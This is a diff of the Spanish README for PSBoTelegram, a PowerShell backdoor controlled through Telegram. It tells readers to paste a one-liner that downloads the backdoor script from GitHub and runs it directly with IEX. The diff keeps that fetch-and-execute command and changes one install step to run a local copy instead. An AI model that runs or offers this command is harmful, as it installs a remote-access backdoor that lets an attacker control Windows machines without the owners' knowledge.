@@ -3,7 +3,7 @@ Backdoor using Telegram and Powershell
 
 Podeis probar el script abriendo una consola de powershell y pegando esto:
 
-    **IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
+**IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
 
         ____  _____ ____      ______     __
        / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
@@ -26,7 +26,8 @@ PSBotTelegram es un script escrito en Powershell que nos crea una backdoor que s
 
 # Instalación en Windows
 
-    **IEX (curl "https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/PSBoTelegram.ps1" ).content**&nbsp;&nbsp;
+    Powershell.exe ./PSBotelegram.ps1
+    
 Los datos que nos pide son los siguientes:  
 
 # Parametros
